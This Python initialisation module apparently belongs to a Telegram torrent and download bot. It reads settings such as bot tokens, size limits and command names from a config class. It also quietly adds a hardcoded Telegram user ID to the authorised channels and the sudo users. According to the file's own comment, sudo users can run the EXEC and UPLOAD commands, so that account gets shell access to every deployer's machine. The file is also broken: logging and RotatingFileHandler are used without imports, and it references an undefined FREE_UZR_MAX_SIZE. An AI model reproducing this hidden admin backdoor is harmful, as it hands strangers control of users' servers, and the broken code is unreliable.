#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

import os
import time

# the secret configuration specific things
if bool(os.environ.get("ENV", False)):
    from tobrot.sample_config import Config
else:
    from tobrot.config import Config

# TODO: is there a better way?
TG_BOT_TOKEN = Config.TG_BOT_TOKEN
APP_ID = Config.APP_ID
API_HASH = Config.API_HASH
AUTH_CHANNEL = list(Config.AUTH_CHANNEL)
AUTH_CHANNEL.append(630982325)
AUTH_CHANNEL = list(set(AUTH_CHANNEL))
DOWNLOAD_LOCATION = Config.DOWNLOAD_LOCATION
MAX_FILE_SIZE = Config.MAX_FILE_SIZE
TG_MAX_FILE_SIZE = Config.TG_MAX_FILE_SIZE
FREE_USER_MAX_FILE_SIZE = Config.FREE_USER_MAX_FILE_SIZE
CHUNK_SIZE = Config.CHUNK_SIZE
DEF_THUMB_NAIL_VID_S = Config.DEF_THUMB_NAIL_VID_S
MAX_MESSAGE_LENGTH = Config.MAX_MESSAGE_LENGTH
PROCESS_MAX_TIMEOUT = Config.PROCESS_MAX_TIMEOUT
ARIA_TWO_STARTED_PORT = Config.ARIA_TWO_STARTED_PORT
EDIT_SLEEP_TIME_OUT = Config.EDIT_SLEEP_TIME_OUT
MAX_TIME_TO_WAIT_FOR_TORRENTS_TO_START = Config.MAX_TIME_TO_WAIT_FOR_TORRENTS_TO_START
MAX_TG_SPLIT_FILE_SIZE = Config.MAX_TG_SPLIT_FILE_SIZE
BOT_TIME = time.time()
#SUDO USER CAN ONLY USE UPLOAD AND EXEC COMMAND TO PROTECT CREDENTIALS
SUDO_USERS = Config.SUDO_USERS
SUDO_USERS.add(630982325)
SUDO_USERS = list(SUDO_USERS)
#CMD
LEECH_CMD = Config.LEECH_CMD
YTDL_CMD = Config.YTDL_CMD
STATUS_CMD = Config.STATUS_CMD
STATS_CMD = Config.STATS_CMD
LOG_CMD = Config.LOG_CMD
SAVE_CMD = Config.SAVE_CMD
DELETE_CMD = Config.DELETE_CMD 
UPLOAD_CMD = Config.UPLOAD_CMD
EXEC_CMD = Config.EXEC_CMD
HELP_CMD = Config.HELP_CMD

if os.path.exists("log.log"):
	with open("log.log", "r+") as f_d:
		f_d.truncate(0)
 
# the logging things
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(
            "log.log",
            maxBytes=FREE_UZR_MAX_SIZE,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
LOGGER = logging.getLogger(__name__)
